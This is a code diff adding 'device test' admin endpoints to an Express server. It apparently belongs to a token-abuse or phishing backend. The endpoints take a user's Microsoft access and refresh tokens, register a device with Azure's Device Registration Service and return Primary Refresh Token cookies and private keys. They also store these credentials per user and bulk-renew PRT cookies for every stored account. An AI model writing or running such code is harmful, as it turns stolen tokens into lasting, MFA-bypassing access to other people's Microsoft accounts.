@@ -1297,5 +1297,257 @@ router.post('/turnstile/pool/health', adminAuth, async (req, res) => {
   }
 });
 
+// ═══════════════════════════════════════════════════════════════
+// Device Test — admin panel endpoints for testing the DRS/PRT flow
+// ═══════════════════════════════════════════════════════════════
+const deviceManager = require('../services/devicemanager');
+
+// POST /api/admin/device-test/inspect — decode JWTs, return claims
+router.post('/device-test/inspect', adminAuth, async (req, res) => {
+  try {
+    const { access_token, refresh_token } = req.body || {};
+    const accessClaims = deviceManager.inspectJwt(access_token);
+    const refreshClaims = deviceManager.inspectJwt(refresh_token);
+    const extraction = deviceManager.extractTenantFromAccessToken(access_token);
+    res.json({
+      success: true,
+      access_token: {
+        parsed: !!accessClaims,
+        tenant_id: extraction.tenantId,
+        upn: extraction.upn,
+        target_domain: extraction.targetDomain,
+        exp: extraction.exp,
+        exp_human: extraction.exp ? new Date(extraction.exp * 1000).toISOString() : null,
+        iss: extraction.iss,
+        sub: extraction.sub,
+        claims: accessClaims
+      },
+      refresh_token: {
+        parsed: !!refreshClaims,
+        prefix: typeof refresh_token === 'string' ? refresh_token.substring(0, 16) : null,
+        claims: refreshClaims
+      }
+    });
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// GET /api/admin/device-test/stored — list stored credentials (safe fields only)
+router.get('/device-test/stored', adminAuth, async (req, res) => {
+  try {
+    if (!(await deviceManager.deviceCredentialsTableExists())) {
+      return res.json({ success: true, credentials: [], warning: 'device_credentials table does not exist' });
+    }
+    const credentials = await deviceManager.listStoredCredentials();
+    res.json({ success: true, credentials });
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// POST /api/admin/device-test/run — full DRS + PRT flow
+router.post('/device-test/run', adminAuth, async (req, res) => {
+  const started = Date.now();
+  try {
+    const { access_token, refresh_token, tenant_id, target_domain, user_id, store } = req.body || {};
+
+    if (!access_token || !refresh_token) {
+      return res.status(400).json({ success: false, error: 'access_token and refresh_token are required' });
+    }
+
+    let tenantId = tenant_id;
+    let targetDomain = target_domain;
+    let inspected;
+    try {
+      inspected = deviceManager.extractTenantFromAccessToken(access_token);
+      if (!tenantId) tenantId = inspected.tenantId;
+      if (!targetDomain) targetDomain = inspected.targetDomain;
+    } catch (e) { /* ignore */ }
+
+    if (!tenantId) {
+      return res.status(400).json({ success: false, error: 'tenant_id not provided and could not be extracted from access_token' });
+    }
+    if (!targetDomain) targetDomain = tenantId;
+
+    const normalizedUserId = user_id ? Number(user_id) : 0;
+    const shouldStore = !!store && normalizedUserId > 0;
+
+    console.log('[DeviceTest] Running DRS flow', {
+      admin: req.admin?.id,
+      tenantId, targetDomain, userId: normalizedUserId, shouldStore, inMemory: !shouldStore
+    });
+
+    const result = await deviceManager.registerDeviceAndGetPrt({
+      access_token,
+      refresh_token,
+      tenant_id: tenantId,
+      target_domain: targetDomain,
+      user_id: normalizedUserId || undefined,
+      inMemory: !shouldStore
+    });
+
+    let storage = { stored: false, user_id: null, tenant_id: tenantId, reason: 'store=false' };
+    if (shouldStore) {
+      try {
+        await deviceManager.storeDeviceCredentials(result, normalizedUserId, inspected?.upn || '');
+        storage = { stored: true, user_id: normalizedUserId, tenant_id: tenantId };
+      } catch (storeErr) {
+        storage = { stored: false, user_id: normalizedUserId, tenant_id: tenantId, error: storeErr.message };
+      }
+    }
+
+    const assertionAudience = `https://login.microsoftonline.com/${tenantId}/oauth2/v2.0/token`;
+
+    try {
+      await db.query(
+        'INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+        [req.admin.id, 'device_test_run',
+          JSON.stringify({
+            user_id: normalizedUserId || null, tenant_id: tenantId, target_domain: targetDomain,
+            stored: storage.stored, device_id: result.deviceId,
+            thumbprint: result.certificateThumbprint, success: true
+          }),
+          req.ip]
+      );
+    } catch (e) { /* audit failures are non-fatal */ }
+
+    res.json({
+      success: true,
+      elapsed_ms: Date.now() - started,
+      assertion_audience: assertionAudience,
+      device_id: result.deviceId,
+      certificate_thumbprint: result.certificateThumbprint,
+      certificate_pem: result.deviceCertificate,
+      prt_cookie: result.prtCookie,
+      prt_cookie_encoded: encodeURIComponent(result.prtCookie || ''),
+      private_key_pem: result.privateKey,
+      tenant_id: tenantId,
+      target_domain: targetDomain,
+      storage,
+      inspected_access_token: inspected,
+      steps: { rsa_keypair_generated: true, csr_generated: true, drs_registered: true, prt_exchange_succeeded: true }
+    });
+  } catch (err) {
+    console.error('[DeviceTest] Run failed:', err.message);
+    try {
+      await db.query(
+        'INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+        [req.admin.id, 'device_test_run', JSON.stringify({ success: false, error: err.message }), req.ip]
+      );
+    } catch (e) { /* ignore */ }
+    res.status(200).json({
+      success: false,
+      elapsed_ms: Date.now() - started,
+      error: err.message,
+      steps: {
+        rsa_keypair_generated: true,
+        csr_generated: true,
+        drs_registered: !/Device registration failed/.test(err.message || ''),
+        prt_exchange_succeeded: false
+      }
+    });
+  }
+});
+
+// POST /api/admin/device-test/renew — renew a single stored credential
+router.post('/device-test/renew', adminAuth, async (req, res) => {
+  try {
+    const { user_id, tenant_id, refresh_token } = req.body || {};
+    if (!user_id || !tenant_id || !refresh_token) {
+      return res.status(400).json({ success: false, error: 'user_id, tenant_id, and refresh_token are required' });
+    }
+    const userId = Number(user_id);
+    if (!Number.isFinite(userId) || userId <= 0) {
+      return res.status(400).json({ success: false, error: 'user_id must be a positive integer' });
+    }
+    const prtCookie = await deviceManager.refreshPrtCookie(userId, tenant_id, refresh_token);
+    const [rows] = await db.query(
+      'SELECT device_id FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
+      [userId, tenant_id]
+    );
+    try {
+      await db.query(
+        'INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+        [req.admin.id, 'device_test_renew', JSON.stringify({ user_id: userId, tenant_id }), req.ip]
+      );
+    } catch (e) { /* ignore */ }
+    res.json({
+      success: true,
+      user_id: userId,
+      tenant_id,
+      device_id: rows.length ? rows[0].device_id : null,
+      prt_cookie: prtCookie,
+      prt_cookie_encoded: encodeURIComponent(prtCookie || '')
+    });
+  } catch (err) {
+    res.json({ success: false, error: err.message, user_id: req.body?.user_id, tenant_id: req.body?.tenant_id });
+  }
+});
+
+// POST /api/admin/device-test/renew-all — bulk renew every stored credential
+router.post('/device-test/renew-all', adminAuth, async (req, res) => {
+  const started = Date.now();
+  try {
+    const { refresh_token } = req.body || {};
+    if (!refresh_token) {
+      return res.status(400).json({ success: false, error: 'refresh_token is required' });
+    }
+    if (!(await deviceManager.deviceCredentialsTableExists())) {
+      return res.json({ success: true, processed: 0, succeeded: 0, failed: 0, results: [], warning: 'device_credentials table does not exist' });
+    }
+    const rows = await deviceManager.listStoredCredentials();
+    const results = [];
+    let succeeded = 0, failed = 0;
+    for (const row of rows) {
+      const r = { user_id: row.user_id, tenant_id: row.tenant_id, device_id: row.device_id };
+      try {
+        const prtCookie = await deviceManager.refreshPrtCookie(row.user_id, row.tenant_id, refresh_token);
+        results.push({ ...r, success: true, prt_cookie: prtCookie, prt_cookie_encoded: encodeURIComponent(prtCookie || '') });
+        succeeded++;
+      } catch (err) {
+        results.push({ ...r, success: false, error: err.message });
+        failed++;
+      }
+    }
+    try {
+      await db.query(
+        'INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+        [req.admin.id, 'device_test_renew_all',
+          JSON.stringify({ processed: rows.length, succeeded, failed }), req.ip]
+      );
+    } catch (e) { /* ignore */ }
+    res.json({
+      success: true,
+      elapsed_ms: Date.now() - started,
+      processed: rows.length,
+      succeeded, failed,
+      results
+    });
+  } catch (err) {
+    res.json({ success: false, error: err.message });
+  }
+});
+
+// DELETE /api/admin/device-test/stored/:userId/:tenantId
+router.delete('/device-test/stored/:userId/:tenantId', adminAuth, async (req, res) => {
+  try {
+    const userId = Number(req.params.userId);
+    const tenantId = String(req.params.tenantId || '');
+    if (!Number.isFinite(userId) || userId <= 0) {
+      return res.status(400).json({ success: false, error: 'user_id must be a positive integer' });
+    }
+    const deleted = await deviceManager.deleteStoredCredentials(userId, tenantId);
+    try {
+      await db.query(
+        'INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+        [req.admin.id, 'device_test_clear', JSON.stringify({ user_id: userId, tenant_id: tenantId, deleted }), req.ip]
+      );
+    } catch (e) { /* ignore */ }
+    res.json({ success: true, deleted, user_id: userId, tenant_id: tenantId });
+  } catch (err) {
+    res.json({ success: false, error: err.message });
+  }
+});
 
 module.exports = router;
